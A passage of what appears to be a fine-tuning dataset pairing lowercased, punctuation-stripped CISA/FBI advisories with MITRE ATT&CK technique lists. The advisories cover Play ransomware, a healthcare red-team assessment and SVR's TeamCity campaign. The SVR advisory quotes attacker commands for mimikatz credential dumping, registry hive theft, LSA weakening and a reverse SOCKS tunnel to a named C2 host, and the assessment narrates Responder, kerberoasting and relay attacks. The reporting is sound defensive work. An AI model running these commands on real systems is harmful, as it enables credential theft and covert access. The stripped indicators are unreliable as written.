drive storage device cloud require accounts password logins eg service account admin accounts domain admin accounts comply nists standards developing managing password policiescpg 2c use longer passwords consisting least 8 characters 64 characters lengthcpg 2b store passwords hashed format using industryrecognized password managers add password user salts shared login credentials avoid reusing passwords implement multiple failed login attempt account lockoutscpg 2g disable password hints refrain requiring password changes frequently per yearnote nist guidance suggests favoring longer passwords instead requiring regular frequent password resets frequent password resets likely result users developing password patterns cyber criminals easily decipher require administrator credentials install software require multifactor authenticationcpg 2h services extent possible particularly webmail virtual private networks accounts access critical systems also see protect multifactor authentication cybergovau keep operating systems software firmware date timely patching one efficient costeffective steps organization take minimize exposure cybersecurity threats prioritize patching known exploited vulnerabilities internetfacing systemscpg 1e organizations advised deploy latest microsoft exchange security updates unable patch disable outlook web access owa updates able undertaken also see patching applications operating systems cybergovau segment networkscpg 2f prevent spread ransomware network segmentation help prevent spread ransomware controlling traffic flows betweenand access tovarious subnetworks restricting adversary lateral movement also see implementing network segmentation segregation identify detect investigate abnormal activity potential traversal indicated ransomware networking monitoring tool aid detecting ransomware implement tool logs reports network traffic including lateral movement activity networkcpg 1e endpoint detection response edr tools particularly useful detecting lateral connections insight common uncommon network connections host filter network traffic preventing unknown untrusted origins accessing remote services internal systems prevents actors directly connecting remote access services established persistence also see inbound traffic filtering technique d3itf install regularly update enable real time detection antivirus software hosts review domain controllers servers workstations active directories new andor unrecognized accountscpg 1a 2o audit user accounts administrative privileges configure access controls according principle least privilegecpg 2e disable unused portscpg 2v consider adding email banner emailscpg 2m received outside organization disable hyperlinks received emails implement timebased access accounts set admin level higher example justintime jit access method provisions privileged access needed support enforcement principle least privilege well zero trust model process networkwide policy set place automatically disable admin accounts active directory level account direct need individual users may submit requests automated process grants access specified system set timeframe need support completion certain task disable commandline scripting activities permissions privileged escalation lateral movement often depend software utilities running command line threat actors able run tools difficulty escalating privileges andor moving laterallycpg 2e maintain offline backups data regularly maintain backup restorationcpg 2r instituting practice organization ensures severely interrupted andor irretrievable data ensure backup data encrypted immutable ie altered deleted covers entire organizations data infrastructurecpg 2k validate security controls addition applying mitigations fbi cisa asds acsc recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa asds acsc recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 311 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa asds acsc recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources stopransomwaregov wholeofgovernment approach gives one central location ransomware resources alerts resource mitigate ransomware attack stopransomware guide nocost cyber hygiene services cyber hygiene services ransomware readiness assessment reporting fbi seeking information shared include boundary logs showing communication foreign ip addresses sample ransom note communications play ransomware actors bitcoin wallet information decryptor files andor benign sample encrypted file fbi cisa asds acsc encourage paying ransom payment guarantee victim files recovered furthermore payment may also embolden adversaries target additional organizations encourage criminal actors engage distribution ransomware andor fund illicit activities regardless whether organization decided pay ransom fbi cisa urge promptly report ransomware incidents local fbi field office fbis internet crime complaint center ic3 cisa via cisas 247 operations center reportcisagov 8882820870 australian organizations impacted require assistance regard ransomware incident contact asds acsc via 1300 cyber1 1300 292 371 submitting report cybergovau disclaimer information report provided informational purposes cisa fbi endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring cisa fbi references1 symantec play ransomware group using new custom datagathering tools2 trendmicro play ransomware spotlight3 sentinellabs ransomware developers turn intermittent encryption evade detection product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1016, T1048, T1059, T1070.001, T1078, T1133, T1190, T1484.001, T1486, T1518.001, T1552, T1560.001, T1562.001, T1570, T1657"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: actions take today harden internal environment mitigate followon activity initial access use phishingresistant multifactor authentication mfa administrative access verify implementation appropriate hardening measures change remove deactivate default credentials implement network segregation controls summary january 2023 cybersecurity infrastructure security agency cisa conducted risk vulnerability assessment rva request healthcare public health hph sector organization identify vulnerabilities areas improvement rva twoweek penetration test entire organization one week spent external testing one week spent assessing internal network part rva cisa assessment team conducted web application phishing penetration database wireless assessments assessed organization large organization deploying onpremises software oneweek external assessment assessment team identify significant exploitable conditions externally available systems may allow malicious actor easily obtain initial access organizations network furthermore assessment team unable gain initial access assessed organization phishing however internal penetration testing team exploited misconfigurations weak passwords issues multiple attack paths compromise organizations domain coordination assessed organization cisa releasing cybersecurity advisory csa detailing rva teams activities key findings provide network defenders software manufacturers recommendations improving organizations customers cyber posture reduces impact followon activity initial access cisa encourages hph sector critical infrastructure organizations deploying onpremises software well software manufacturers apply recommendations mitigations section csa harden networks malicious activity reduce likelihood domain compromise download pdf version report aa23349a enhancing cyber resilience insights cisa healthcare public health sector risk vulnerability assessment pdf 74423 kb technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section tables threat actors activity mapped mitre attck tactics techniques corresponding mitigation andor detection recommendations assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool introduction cisa authority upon request provide analyses expertise technical assistance critical infrastructure owners operators provide operational timely technical assistance federal nonfederal entities respect cybersecurity risks see generally 6 usc 652c5 659c6 receiving request rva organization coordinating highlevel details engagement certain personnel organization cisa conducted rva january 2023 rvas cisa tests security posture organizations network twoweek period determine risk vulnerability exploitability systems networks first week external phase team tests public facing systems identify exploitable vulnerabilities second week internal phase team determines susceptibility environment actor internal access eg malicious cyber actor insider threat assessment team offers five services web application assessment assessment team uses commercial open source tools identify vulnerabilities publicfacing internal web applications demonstrating could exploited phishing assessment assessment team tests susceptibility staff infrastructure phishing attacks determines impact phished user workstation could internal network rva team crafts compelling email pretexts generates payloads similar ones used threat actors order provide realistic threat perspective organization penetration testing assessment team tests security environment simulating scenarios advanced cyber actor may attempt teams goals establish foothold escalate privileges compromise domain rva team leverages open source commercial tools host discovery port service mapping vulnerability discovery analysis vulnerability exploitation database assessment assessment team uses commercial database tools review databases misconfigurations missing patches wireless assessment assessment team uses specialized wireless hardware assess wireless access points connected endpoints user awareness vulnerabilities assessed organization hph sector see table 1 services inscope rva phase external assessment penetration web application testing cisa team identify significant exploitable conditions penetration web application testing may allow malicious actor easily obtain initial access organizations network phishing assessment cisa team conducted phishing assessments included user systems testing teams phishing assessment unsuccessful organizations defensive tools blocked execution teams payloads payload testing resulted teams payloads blocked hostbased protections combination browser policy antivirus software payloads successfully downloaded disk without immediately removed upon execution antivirus software detected malicious code blocked running payloads appeared successfully evade hostbased protections create connection command control c2 infrastructure indicating may incompatible system blocked border protections since none payloads successfully connected assessment teams c2 server team conducted credential harvesting phishing campaign users prompted follow malicious link within phishing email pretext verifying tax information taken fake login form twelve unique users organization submitted credentials malicious form cisa team unable leverage credentials limited access externalfacing resources additionally organization multifactor authentication mfa implemented cloud accounts note time assessment cisa teams operating procedures include certain machineinthemiddle attacks could circumvented form mfa place however important note tools like evilginx1 leveraged bypass nonphishing resistant forms mfa furthermore user executes malicious file opening connection malicious actors command control server mfa prevent actor executing commands carrying actions context user phase ii internal assessment database web application wireless testing cisa assessment team identify significant exploitable conditions database wireless testing may allow malicious actor easily compromise confidentiality integrity availability tested environment team identify default credentials multiple web interfaces web application testing used default printer credentials penetration testing see attack path 2 section information penetration testing assessment team starts internal penetration testing connection organizations network without valid domain account teams goal compromise domain gaining domain admin enterprise administratorlevel permissions generally team first attempts gain domain user access escalate privileges domain compromised process called attack pathacquiring initial access organization escalating privileges domain compromised andor vital assets organization accessed attack path requires specialized expertise realistic adversaries may environment assessment team compromised organizations domain four unique attack paths fifth attack path team obtained access sensitive information see sections description teams attack paths mapped mitre attck enterprise framework see findings section information issues enabled team compromise domain attack path 1 assessment team initiated llmnrnbtnsmdnsdhcp poisoning responder2 works two steps responder listens multicast name resolution queries eg llmnr udp5355 nbtns udp137 right conditions spoofs response direct victim host cisacontrolled machine responder running victim connects machine responder exploits connection perform malicious functions stealing credentials opening session targeted host tool cisa team captured fiftyfive new technology local area network manager version 2 ntlmv2 hashes including ntlmv2 hash service account note ntlmv2 variations hash protocol used clients join domain authenticate active directory forests authenticate earlier versions windows operating systems oss authenticate computers normally part domain3 cracking passwords may enable malicious actors establish foothold domain move laterally elevate privileges hash belongs privileged account service account weak password allowing team quickly crack obtain access organizations domain domain access cisa assessment team enumerated accounts service principal name spn set spn unique service identifier used kerberos authentication4 accounts spn susceptible kerberoasting cisa team used impackets5 getuserspns tool request ticketgranting service tgs tickets accounts spn set obtained kerberos hashes three accounts domain administrator privilegesoffline team cracked account 1 weak password using crackmapexec6 assessment team used account 1 successfully connect domain controller dc team confirmed compromised domain account 1 readwrite permissions c administrative share see figure 1 figure 1 account 1 domain admin privileges demonstrate impact compromising account 1 assessment team used access virtual machine interface malicious actor compromised account 1 could use modify power andor delete critical virtual machines including domain controllers file servers attack path 2 team first mapped network identify open web ports attempted access various web interfaces default administrator credentials cisa team able log printer interface default password found device configured domain credentials allow employees save scanned documents network share logged printer interface administrator team 1 modified save file configuration use file transfer protocol ftp instead server message block smb 2 changed server name network path point cisacontrolled machine running responder team executed connection test sent username password ftp cisa machine running responder captured cleartext credentials nonprivileged domain account account 2 using account 2 certipy7 team enumerated potential certificate template vulnerabilities found active directory certificate services adcs note adcs templates used build certificates different types servers entities organizations network malicious actors exploit template misconfigurations manipulate certificate infrastructure issuing fraudulent certificates andor escalate user privileges domain administrator webserver template misconfigured allow authenticated users permission change properties template via object control permissions write property principals set authenticated users enroll certificate via enrollment permissions including authenticated users group request certificate different user via enrolleesuppliessubject set true see figure 2 displayed certificate template misconfigurations templates client authentication set false preventing cisa assessment team requesting certificate could used authenticate server domain demonstrate misconfiguration could lead privilege escalation assessment team leveraging status mere authenticated user briefly changed webserver template properties set client authentication true certificate could obtained server authentication ensuring property set back original setting false immediately thereafter team used certipy account 2 credentials request certificate domain administrator account account 3 team authenticated domain controller account 3 generated certificate retrieved ntlm hash account 3 team used hash authenticate domain controller validated domain administrator privileges demonstrating compromise domain via webserver template misconfiguration attack path 3 cisa team used tool called crackmapexec spray easily guessable passwords across domain accounts obtained two sets valid credentials standard domain user accounts assessment team leveraged one domain user accounts account 4 enumerate adcs via certipy found web enrollment enabled see figure 3 web enrollment enabled malicious actors abuse certain services andor misconfigurations environment coerce server authenticate actorcontrolled computer relay authentication adcs web enrollment service obtain certificate servers account known relay attack figure 3 misconfigured adcs enumerated via certipy team used petitpotam8 account 4 credentials force organizations domain controller authenticate cisaoperated machine used certipy relay coerced authentication attempt adcs web enrollment service receive valid certificate account 5 domain controller machine account used certificate acquire tgt account 5 tgt account 5 cisa team used dcsync dump ntlm hash account 3 domain administrator accountsee attack path 2 section effectively leading domain compromise attack path 4 cisa team identified several systems organizations network enforce smb signing team exploited misconfiguration obtain cleartext credentials two domain administrator accounts first team used responder capture ntlmv2 hash domain administrator account next used impackets ntlmrelayx tool9 relay authentication domain administrator opening socks connection host enforce smb signing team used donpapi10 dump cleartext credentials socks connection obtained credentials two additional domain administrator accounts cisa team validated privileges accounts checking readwrite access domain controller c share demonstrating domain administrator access therefore domain compromise attack path 5 team vulnerability scanning identified server vulnerable cve20170144 improper input validationcwe20 vulnerability known eternalblue affects smb version 1smbv1 enables remote code executionsee figure 4 figure 4 checking eternalblue vulnerability cisa assessment team executed wellknown eternalblue exploit established shell server shell allowed execute commands context local system account local system account cisa dumped password hashes security account manager sam database team parsed hashes identified one local administrator account upon parsing contents sam database dump cisa team identified ntlm hash local administrator account used authenticate various services team sprayed acquired ntlm hash across network segment identified multiple instances password reuse allowing team access various resources including sensitive information hash findings key issues cisa assessments team identified several findings potentially exploitable vulnerabilities could compromise confidentiality integrity availability tested environment finding listed includes description supporting details see mitigations section recommendations mitigate issues cisa team rated findings severity scale critical informational see table 2 cisa assessment team identified four high severity vulnerabilities one medium severity vulnerability penetration testing contributed teams ability compromise domain see table 3 list description findings addition issues listed team identified three high seven medium severity findings vulnerabilities misconfigurations may allow malicious actor compromise confidentiality integrity availability tested environment see table 4 list description findings additional issues cisa team identified one informational severity within organizations networks systems issues may allow malicious actor compromise confidentiality integrity availability tested environment readily exploitable information provided encourage stakeholder investigate issues adjust environments eliminate certain aspects needed urgency low noted strengths cisa team noted following business technical administrative components enhanced network security posture tested environment organizations network found several strong securityoriented characteristics effective antivirus software endpoint detection response capabilities good policies best practices protecting users malicious files including allowing users mount iso files minimal external attack surface limiting adversarys ability leverage external vulnerabilities gain initial access organizations networks systems strong wireless protocols network segmentation organizations security also demonstrated ability detect cisa teams actions throughout testing overall situational awareness use logs alerts organization used mfa cloud accounts assessment team obtained cloud credentials via phishing campaign unable use mfa prompts mitigations network defenders cisa recommends hph sector critical infrastructure organizations implement mitigations table 6 mitigate issues listed findings section advisory mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections additionally cisa recommends hph sector organizations implement following strategies mitigate cyber threats mitigation strategy 1 asset management security cisa recommends hph sector organizations implement maintain asset management policy reduce risk exposing vulnerabilities devices services could exploited threat actors gain unauthorized access steal sensitive data disrupt critical services focus areas mitigation strategy include asset management asset security addressing asset inventory procurement decommissioning network segmentation relate hardware software data assets mitigation strategy 2 identity management device security cisa recommends entities secure devices digital accounts manage online access protect sensitive data piiphi compromise focus areas mitigation strategy include email security phising prevention access management password policies data protection loss prevention device logs monitoring solutions mitigation strategy 3 vulnerability patch configuration management cisa recommends entities mitigate known vulnerabilities establish secure configuration baselines reduce likelihood threat actors exploiting known vulnerabilities breach organizational networks focus areas mitigation strategy include vulnerability patch management configuration change management information mitigations strategies see cisas healthcare public health sector webpage software manufacturers mitigations apply hph sector critical infrastructure organizations onpremises hybrid environments recognizing insecure software root cause majority flaws responsibility end user cisa urges software manufacturers implement following reduce prevalence misconfigurations weak passwords weaknesses identified exploited assessment team embed security product architecture throughout entire software development lifecycle sdlc eliminate default passwords provide software default passwords eliminate default passwords require administrators set strong passwordcpg 2b installation configuration create secure configuration templates provide configuration templates certain safe settings based organizations risk appetite eg low medium high security templates support templates hardening guides based risks manufacturer identified default configuration secure one organizations need opt desire less secure configuration design products compromise single security control result compromise entire system example narrowly provision user privileges default employ acls reduce impact compromised account make difficult malicious cyber actor escalate privileges move laterally mandate mfa ideally phishingresistant mfa privileged users make mfa default rather optin feature mitigations align tactics provided joint guide shifting balance cybersecurity risk principles approaches secure design software cisa urges software manufacturers take ownership improving security outcomes customers applying secure design tactics using secure design tactics software manufacturers make product lines secure box without requiring customers spend additional resources making configuration changes purchasing security software logs monitoring making routine updates information secure design see cisas secure design webpage information common misconfigurations guidance reducing prevalence see joint advisory nsa cisa red blue teams share top ten cybersecurity misconfigurations validate security controls addition applying listed mitigations cisa recommends exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory cisa recommends testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see tables 7 16 align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process cisa recommends continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory resources consolidated findings rvas fiscal year mapped mitre attck see cisas risk vulnerability assessments page see joint csa nsa cisa red blue teams share top ten cybersecurity misconfigurationsfor information common cybersecurity misconfigurations large organizations ttps actors use exploit misconfigurations see cisas healthcare public health sector webpage see cisas redeye tool cisas github page redeye interactive opensource analytic tool used visualize report red team command control activities see cisas redeye tool overview video information references1 github kgretzky evilginx2 github lgandx responder3 network security lan manager authentication level windows security microsoft learn4 service principal names win32 apps microsoft learn5 github fortra impacket6 github byt3bl33d3r crackmapexec7 github ly4k certipy8 github topotam petitpotam9 github fortra impacket examples10 github loginsecurite donpapi11 sp 80063b digital identity guidelines authentication lifecycle management csrc nistgov appendix mitre attck tactics techniques version history december 14 2023 initial version product provided subject thisnotificationand thisprivacy usepolicy"}, {"role": "assistant", "content": "The threat corresponds to MITRE ATT&CK techniques: T1003, T1003.002, T1021, T1021.002, T1039, T1040, T1046, T1059, T1059.003, T1078.001, T1078.002, T1080, T1087.002, T1110.002, T1110.003, T1133, T1187, T1210, T1529, T1550, T1550.002, T1557, T1557.001, T1558, T1558.003, T1649"}]}
{"messages": [{"role": "system", "content": "You are a cybersecurity AI trained to analyze threat intelligence reports."}, {"role": "user", "content": "Analyze this threat report: summary us federal bureau investigation fbi us cybersecurity infrastructure security agency cisa us national security agency nsa polish military counterintelligence service skw cert polska certpl uks national cyber security centre ncsc assess russian foreign intelligence service svr cyber actorsalso known advanced persistent threat 29 apt 29 dukes cozybear nobeliummidnight blizzardare exploiting cve202342793at large scale targeting servers hosting jetbrains teamcity software since september 2023 software developers use teamcity software manage automate software compilation building testing releasing compromised access teamcity server would provide malicious actors access software developers source code signing certificates ability subvert software compilation deployment processesaccess malicious actor could use conduct supply chain operations although svr used access compromise solarwinds customers 2020 limited number seemingly opportunistic types victims currently identified indicate svr used access afforded teamcity cve similar manner svr however observed using initial access gleaned exploiting teamcity cve escalate privileges move laterally deploy additional backdoors take steps ensure persistent longterm access compromised network environments bring russias actions public attention authoring agencies providing information svrs recent compromise aid organizations conducting investigations securing networks provide compromised entities actionable indicators compromise iocs empower private sector cybersecurity companies better detect counter svrs malicious actions authoring agencies recommend organizations affected systems immediately apply available patches workarounds assume compromise initiate threat hunting activities using iocs provided csa potential compromise detected administrators apply incident response recommendations included csa report key findings fbi cisa download pdf version report aa23347a russian foreign intelligence service svr exploiting jetbrains teamcity cve globally pdf 77465 kb downloadable copy iocs see aa23347a stix xml xml 7699 kb aa23347a stix json json 6929 kb threat overview svr cyber operations pose persistent threat public private organizations networks globally since 2013 cybersecurity companies governments reported svr operations targeting victim networks steal confidential proprietary information decade later authoring agencies infer longterm targeting pattern aimed collecting enabling collection foreign intelligence broad concept russia encompasses information politics economics military foreign states science technology foreign counterintelligence svr also conducts cyber operations targeting technology companies enable future cyber operations decade ago public reports svr cyber activity focused largely svrs spear phishing operations targeting government agencies think tanks policy analysis organizations educational institutions political organizations category targeting consistent svrs responsibility collect political intelligence collection long svrs highest priority russian government political intelligence includes development execution foreign policies also development execution domestic policies political processes drive december 2016 us government published joint analysis report titled grizzly steppe russian malicious cyber activity describes svrs compromise us political party leading presidential election svrs use spear phishing operations visible today ongoing diplomatic orbiter campaign primarily targeting diplomatic agencies 2023 skw certpl published joint analysis report describing tools techniques used svr target embassies dozens countries less frequently reporting svr cyber activity addressed aspects svrs foreign intelligence collection mission july 2020 us uk canadian governments jointly published advisory revealing svrs exploitation cves gain initial access networks deployment custom malware known wellmess wellmail sorefang target organizations involved covid19 vaccine developmentalthough listed 2020 advisory mention authoring agencies disclose svrs wellmess campaign also targeted energy companies biomedical energy targets consistent svrs responsibility support russian economy pursuing two categories foreign intelligence known economic intelligence science technology april 2021 us government attributed supply chain operation targeting solarwinds information technology company customers svr attribution marked discovery svr since least 2018 expanded range cyber operations include widespread targeting information technology companies least targeting aimed enabling additional cyber operations following attribution us uk governments published advisories highlighting additional svr ttps including exploitation various cves svrs use low slow password spraying techniques gain initial access victims networks exploitation zeroday exploit exploitation microsoft 365 cloud environments newly attributed operation targeting networks hosting teamcity servers svr demonstrably continues practice targeting technology companies choosing exploit cve202342793 software development program authoring agencies assess svr could benefit access victims particularly allowing threat actors compromise networks dozens software developers jetbrains issued patch cve midseptember 2023 limiting svrs operation exploitation unpatched internetreachable teamcity servers authoring agencies assess svr yet used accesses software developers access customer networks likely still preparatory phase operation access companies networks presents svr opportunities enable hardto detect command control c2 infrastructure technical details note advisory uses mitre attck enterprise framework version 14 see mitre attck tactics techniques section table threat actors activity mapped mitre attck tactics techniques assistance mapping malicious cyber activity mitre attck framework see cisa mitre attcks best practices mitre attck mapping cisas decider tool svr followed similar playbook compromise also adjusted operating environment presented steps actions executed every host initial access exploitation svr started exploit internetconnected jetbrains teamcity servers late september 2023 using cve202342793 enables insecure handling specific paths allowing bypassing authorization resulting arbitrary code execution server authoring agencies observations show teamcity exploitation usually resulted code execution high privilegesgranting svr advantageous foothold network environment authoring agencies currently aware initial access vector jetbrains teamcity currently exploited svr host reconnaissance initial observations show svr used following basic builtin commands perform host reconnaissance whoami priv whoami whoami groups whoami domain nltest dclist nltest dsgetdc tasklist netstat wmic noderedacted userredacted passwordredactedprocess list brief wmic noderedacted process list brief wmic process get commandline wmic process procid get commandline wmic process namegooglecrashhandler64exe get commandlineprocessed powershell adsisearchersamaccountnameredactedfindallproperties powershell adsisearchersamaccountnameredactedfindallpropertiesmemberof powershell getwmiobject class win32service computername powershell getwindowsdriver online file exfiltration additionally authoring agencies observed svr exfiltrating files may provide insight host systems operating system cwindowssystem32ntoskrnlexeto precisely identify system version likely prerequisite deploy edrsandblast sql server executable files based review post exploitation actions svr showed interest specific files sql server installed compromised systems cprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqlmindll cprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqllosdll cprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqllangdll cprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqltsesdll cprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsecforwarderdll visual studio files based review post exploitation actions svr showed interest specific files visual studio cprogram files x86microsoft visual studio2017sqlcommon7idevsixautoupdateexe update management agent files based review post exploitation actions svr showed interest executables configuration patch management software cprogram files x86patchmanagementinstallationagent12httpdbinhttpdexe cprogram files x86patchmanagementinstallationagent12httpd cprogramdatagfilanguard 12httpdconfighttpdconf interest sql server based review exploitation svr also showed interest details sql server powershell compressarchive path cprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqlmindllcprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqllosdllcprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqllangdllcprogram filesmicrosoft sql servermssql14mssqlservermssqlbinnsqltsesdll destinationpath cwindowstemp1sqlzip svr cyber actors also exfiltrated secforwarderdll tactics used avoid detection avoid detection svr used bring vulnerable driver technique disable outright kill endpoint detection response edr antivirus av software done using open source project called edrsandblastthe authoring agencies observed svr using edrsandblast remove protected process light ppl protection used controlling protecting running processes protecting infection actors inject code avedr processes small subset victims additionally executables likely detected ie mimikatz executed memory several cases svr attempted hide backdoors via abusing dll hijacking vulnerability zabbixsoftware replacing legitimate zabbix dll one containing graphicalproton backdoor backdooring open source application developed microsoft named vcperf svr modified copied publicly available sourcecode execution backdoored vcperf dropped several dlls disc one graphicalproton backdoor abusing dll hijacking vulnerability webrootantivirus software replacing legitimate dll one containing graphicalproton backdoor avoid detection network monitoring svr devised covert c2 channel used microsoft onedrive dropbox cloud services enable obfuscation data exchanged malware via onedrive dropbox hidden inside randomly generated bmp files illustrated privilege escalation facilitate privilege escalation svr used multiple techniques including winpeasnolmhash registry key modification mimikatz tool svr modified nolmhash registry using following reg command reg add hkeylocalmachinesystemcurrentcontrolsetcontrollsa v nolmhash regdword 0 f svr used following mimikatz commands privilegedebug lsadumpcache lsadumpsecrets lsadumpsam sekurlsalogonpasswords persistence svr relied scheduled tasks secure persistent execution backdoors depending privileges svr executables stored one following directories cwindowstemp cwindowssystem32 cwindowswinstore svr made modifications using schtasksexe binary multiple variants arguments passed schtasksexe found appendix b indicators compromise secure longterm access environment svr used rubeustoolkit craft ticket granting tickets tgts sensitive data exfiltration svr exfiltrated following windows registry hives victims hklmsystem hklmsam hklmsecurity order exfiltrate windows registry svr saved hives files packed exfiltrated using backdoor capability used reg save save system sam security registry hives used powershell stage zip archives cwindowstemp directory reg save hklmsystem cwindowstemp1sysa reg save hklmsam cwindowstemp1samsa reg save hklmsecurity cwindowstemp1sesa powershell compressarchive path cwindowstemp1 destinationpath cwindowstempszip force del cwindowstemp1 f q specific cases svr used sharpchromiumtool obtain sensitive browser data session cookies browsing history saved logins svr also used dsinternals open source tool interact directory services dsinternalsallows obtain sensitive domain information network reconnaissance svr built secure foothold gained awareness victims teamcity server focused network reconnaissance svr performed network reconnaissance using mix builtin commands additional tools port scanner powersploit launched memory svr executed following powersploit commands getnetcomputer getnetgroup getnetuser uacfilter notaccountdisable select samaccountname description pwdlastset logoncount badpwdcount getnetdidomain getaduser getdomainuser username getnetuser preauthnotrequire getnetcomputer select samaccountname getnetuser spn select serviceprincipalname tunneling compromised environments selected environments svr used additional tool named rrexea modified open source reverse socks tunneler named rsockstunto establish tunnel c2 infrastructure authoring agencies aware following infrastructure used conjunction rrexe 652097203443 poetpagescom8443 svr executed rsockstun either memory using windows management instrumentation command line wmic utility dropping disk wmic process call create cprogram fileswindows defender advanced threat protectionsenseexe connect poetpagescom pass m5540sddsf234232fsl45t31 lateral movement svr used wmic facilitate lateral movement wmic noderedacted userredacted passwordredacted process call create rundll32 cwindowssystem32aclnumsinverthostdll aclnumsinverthost svr also modified disablerestrictedadmin key enable remote connections modified registry using following reg command reg add hkeylocalmachinesystemcurrentcontrolsetcontrollsa v disablerestrictedadmin regdword 0 f adversary toolset course teamcity operation svr used multiple custom open source available tools backdoors following custom tools observed use operation graphicalprotonis simplistic backdoor uses onedrive dropbox randomly generated bmps exchange data svr operator execution graphicalproton gathers environment information active tcpudp connections running processes well user host domain names onedrive used primary communication channel dropbox treated backup channel api keys hardcoded malware communicating cloud services graphicalprotongenerates randomly named directory used store infectionspecific bmp files commands results directory name rerandomized time graphicalproton process started bmp files used exchange data generated following way compress data using zlib encrypt data using custom algorithm add string literal encrypted data create random bmp random rectangle finally encode encrypted data within lower pixel bits graphicalproton backdoor remained mostly unchanged months tracking avoid detection adversary wrapped tool various different layers obfuscation encryption encoders stagers two specific variants graphicalproton packaging especially noteworthy variant uses dll hijacking zabbix means start execution potentially provide longterm hardtodetect access variant masks within vcperf opensource c build analysis tool microsoft graphicalproton https variant variant graphicalproton backdoor recently introduced svr forgoes using cloudbased services c2 channel instead relies http requestto legitimize c2 channel svr used reregistered expired domain set dummy wordpress website execution https variant graphicalproton split two files stager encrypted binary file contains code mitre attck tactics techniques see tables referenced threat actor tactics techniques advisory additional mitigations see mitigations section indicators compromise note please refer appendix b list iocs victim types result latest svr cyber activity fbi cisa nsa skw cert polska ncsc identified dozen compromised companies united states europe asia australia aware hundred compromised devices though assess list represent full set compromised organizations generally victim types fit sort pattern trend aside unpatched internetreachable jetbrains teamcity server leading assessment svrs exploitation victims networks opportunistic nature necessarily targeted attack identified victims included energy trade association companies provide software billing medical devices customer care employee monitoring financial management marketing sales video games well hosting companies tools manufacturers small large companies detection methods following rules used detect activity linked adversary activity rules serve examples adapt organizations environment telemetry sigma rules yara rules following rule detects known graphicalproton variants note rules meant threat hunting tested larger dataset mitigations fbi cisa nsa skw cert polska ncsc assess scope indiscriminate targeting campaign poses threat public safety recommend organizations implement mitigations improve organizations cybersecurity posture mitigations align crosssector cybersecurity performance goals cpgs developed cisa national institute standards technology nist cpgs provide minimum set practices protections cisa nist recommend organizations implement cisa nist based cpgs existing cybersecurity frameworks guidance protect common impactful threats tactics techniques procedures visit cisas crosssector cybersecurity performance goals information cpgs including additional recommended baseline protections apply available patches cve202342793 issued jetbrains teamcity midseptember 2023 already completed monitor network evidence encoded commands execution network scanning tools ensure hostbased antivirusendpoint monitoring solutions enabled set alert monitoring reporting disabled communication lost host agent reasonable amount time require use multifactor authenticationcpg 13 services extent possible particularly email virtual private networks accounts access critical systems organizations adopt multifactor authentication mfa additional layer security users access sensitive data enabling mfa significantly reduces risk unauthorized access even passwords compromised keep operating systems software firmware date immediately configure newlyadded systems network including used testing development work follow organizations security baseline incorporate enterprise monitoring tools audit log files identify attempts access privileged certificates creation fake identity providers deploy software identify suspicious behavior systems deploy endpoint protection systems ability monitor behavioral indicators compromise use available public resources identify credential abuse cloud environments configure authentication mechanisms confirm certain user activities systems including registering new devices validate security controls addition applying mitigations fbi cisa nsa skw cert polska ncsc recommend exercising testing validating organizations security program threat behaviors mapped mitre attck enterprise framework advisory fbi cisa nsa skw cert polska ncsc recommend testing existing security controls inventory assess perform attck techniques described advisory get started select attck technique described advisory see previous tables align security technologies technique test technologies technique analyze detection prevention technologies performance repeat process security technologies obtain set comprehensive performance data tune security program including people processes technologies based data generated process fbi cisa nsa skw cert polska ncsc recommend continually testing security program scale production environment ensure optimal performance mitre attck techniques identified advisory references fbi dhs cisa joint cyber security advisory russian foreign intelligence service svr cyber operations trends best practices network defenders nsa cisa fbi joint cyber security advisory russian svr targets us allied networks cisa remediating networks affected solarwinds active directorym365 compromise cisa alert aa21008a detecting postcompromise threat activity microsoft cloud environments cisa alert aa20352a advanced persistent threat compromise government agencies critical infrastructure private sector organizations cisa cisa insights every leader needs know ongoing apt cyber activity fbi cisa joint cybersecurity advisory advanced persistent threat actors targeting us think tanks cisa malicious activity targeting covid19 research vaccine development ncsc cse nsa cisa advisory apt 29 targets covid19 vaccine development information report provided informational purposes fbi cisa nsa skw cert polska ncsc endorse commercial entity product company service including entities products services linked within document reference specific commercial entities products processes services service mark trademark manufacturer otherwise constitute imply endorsement recommendation favoring fbi cisa nsa skw cert polska ncsc version history december 12 2023 initial version appendix indicators compromise cve202342793 windows system log file cteamcitylogsteamcityserverlog contain log message attacker modified internalproperties file also log message every process created via apprestdebugprocesses endpoint addition showing command line used user id user account whose authentication token used attack also shown example20230926 115346970 info ntrollersfilebrowsecontroller file edited cprogramdatajetbrainsteamcityconfiginternalproperties user id120230926 115346970 info sbuildserveractivitiesaudit serverfilechange file 